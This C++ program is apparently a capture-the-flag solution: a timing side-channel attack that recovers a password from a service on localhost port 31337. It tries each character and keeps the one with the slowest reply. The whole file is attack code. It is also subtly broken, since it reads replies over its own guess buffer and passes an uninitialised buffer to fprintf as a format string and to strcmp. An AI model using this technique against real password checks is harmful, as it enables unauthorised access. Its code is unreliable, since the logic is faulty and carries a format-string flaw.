#include <arpa/inet.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <chrono>

#define CLIENT_BUFFER_SIZE     1024
#define PASSWORD_SIZE 512

using namespace std;
using namespace std::chrono;

int main(int argc, char* argv[]) {
    int socketId = socket(PF_INET, SOCK_STREAM, 0);

    struct sockaddr_in serverAddr;
    socklen_t addrSize = sizeof(serverAddr);
    bzero((char*)&serverAddr, sizeof(serverAddr));
    serverAddr.sin_family       = AF_INET;
    serverAddr.sin_port         = htons(31337);
    serverAddr.sin_addr.s_addr  = inet_addr("127.0.0.1");
    connect(socketId, (struct sockaddr*)&serverAddr, addrSize);

	int characterIndex = 0;
	char buffer[PASSWORD_SIZE];
	char clientBuffer[CLIENT_BUFFER_SIZE];
	bzero(buffer, PASSWORD_SIZE);

	while(characterIndex < PASSWORD_SIZE - 1) {
		char iterationChar = 65;
		double maxTime = 0;
		char maxChar = 0;

		while(iterationChar <= 127) {
			buffer[characterIndex] = iterationChar;
			write(socketId, buffer, strlen(buffer));
			high_resolution_clock::time_point t1 = high_resolution_clock::now();
    		size_t get = read(socketId, buffer, CLIENT_BUFFER_SIZE - 1);
			high_resolution_clock::time_point t2 = high_resolution_clock::now();
    		buffer[get] = '\0';
			std::chrono::duration<double, std::nano> nanoSeconds = t2 - t1;
			double durationLong = nanoSeconds.count();
			if(durationLong > maxTime) {
				maxChar = iterationChar;
				maxTime = durationLong;
			}

			iterationChar += 1;
			fprintf(stdout, clientBuffer);
			if(strcmp(clientBuffer, "Wrong!\n") != 0) {
				fprintf(stdout, "Answer found ----------");
				fprintf(stdout, "%s\n", buffer);
				fprintf(stdout, "%s\n", clientBuffer);
				return 0;
			}
		}
		buffer[characterIndex] = maxChar;
		characterIndex += 1;
	}

    shutdown(socketId, SHUT_WR);
    close(socketId);
}